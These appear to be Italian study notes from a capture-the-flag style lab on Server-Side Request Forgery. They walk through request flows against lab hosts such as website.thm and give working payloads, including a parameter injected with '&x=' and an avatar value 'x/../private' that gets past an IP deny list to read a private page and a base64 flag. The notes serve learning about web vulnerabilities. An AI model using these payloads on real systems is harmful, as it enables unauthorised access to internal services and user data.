@@ -1,0 +1,67 @@
+1)H4x0r richiede
+http://website.thm/stock?url=http://api.website.thm/api/user
+anche se website.thm server si aspetta
+http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123
+#
+2)website.thm richiede
+http://api.website.thm/api/user
+al server API api.website.thm
+#
+3)il server API api.website.thm invia le informazioni utente al website.thm invece dell'informazione dello stock
+#
+4)website.thm ritorna le informazioni utente ad h4x0r
+#
+Qui l'attaccante ha modificato la richiesta al server API per far sì che la pagina che gli venisse mostrata fosse quella delle informazioni dell'utente, e ha ottenuto controllo completo delle pagina
+richiesta dal website
+===================================================================================================
+Nel secondo esempio, h4x0r ha controllo sul percorso solo facendo Directory Traversal
+raggiungendo la pagina /api/user quando il website riceve /../user
+1)http://website.thm/stock?url=/../user
+#
+2)qui il website richiede
+http://api.website.thm/api/stock/../user
+anche se si aspettava
+http://website.thm/stock?url=/item?id=123
+#
+3)il server API invia i dati utente
+#
+4)website.thm riporta i dati utente ad h4x0r
+===================================================================================================
+ESEMPIO PRATICO N1
+
+ho questo url
+https://website.thm/item/2?server=api
+vuole richiedere la pagina api
+
+ma io voglio richiedere questo
+https://server.website.thm/flag?id=9
+
+quindi lo inserisco nel payload al posto di api
+https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
+
+e aggiungo alla fine &x= perchè quando il webserver farà la richiesta
+https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2
+&x= fa ignorare all'URL tutto ciò che c'è appeso dopo
+
+effettivamente richiedendo
+https://server.website.thm/flag?id=9
+dandomi accesso alla pagina 
+===================================================================================================
+ESEMPIO PRATICO N2
+
+In un esercizio di content discovery contro Acme IT Support, abbiamo scoperto due nuovi endpoints: /private e /customers/new-account-page. La prima è una pagina che ci blocca, dicendoci che non possiamo accedere col nostro IP - la seconda, è una pagina di creazione di un nuovo account, dove ci fa scegliere una propic.
+
+Allora, qua vado alla pagina /customers
+mi iscrivo, poi vado alla pagina per la nuova propic
+quando cambio il valore dell'avatar
+a /private pensando di aggirare il blocco dell'IP
+non funziona, in questo caso perchè probabilmente la web app ha una deny list
+bloccando accesso al /private endpoint
+
+Directory Traversal
+è la tecnica che può aiutarci
+x/../private
+
+e il gioco è fatto, ora il source code per l'avatar è il contenuto della pagina /private
+(infatti la modifica dell'avatar sulla webapp non ci mostra una foto)
+e ottendo la mia flag una volta che lo decodifico essendo base64
